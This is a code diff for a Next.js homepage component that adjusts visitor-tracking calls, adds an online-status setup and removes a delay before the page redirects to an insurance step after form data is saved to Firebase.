@@ -7,7 +7,7 @@ import { Input } from "@/components/ui/input"
 import { Globe, RefreshCw } from 'lucide-react'
 import { FullPageLoader } from "@/components/loader"
 import { StepIndicator } from "@/components/step-indicator"
-import { getOrCreateVisitorID, initializeVisitorTracking, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
+import { getOrCreateVisitorID, initializeVisitorTracking, checkIfBlocked, setupOnlineStatus } from "@/lib/visitor-tracking"
 import { useAutoSave } from "@/hooks/use-auto-save"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 import { addData, saveToHistory } from "@/lib/firebase"
@@ -86,7 +86,6 @@ export default function HomePage() {
           
           // Initialize tracking
           await initializeVisitorTracking(visitorID)
-          await updateVisitorPage(visitorID, "home", 1)
         })()
         
         // Race between init and timeout
@@ -98,8 +97,8 @@ export default function HomePage() {
         setLoading(false)
       }
     }
-    
     init()
+    setupOnlineStatus(visitorID)
   }, [visitorID])
   
   const refreshCaptcha = () => {
@@ -204,10 +203,8 @@ export default function HomePage() {
       homeCompletedAt: new Date().toISOString()
     }).then(() => {
       // Wait 1.5 seconds before moving to next step
-      setTimeout(() => {
         setLoading(false)
         router.push('/insur')
-      }, 1500)
     })
   }
   
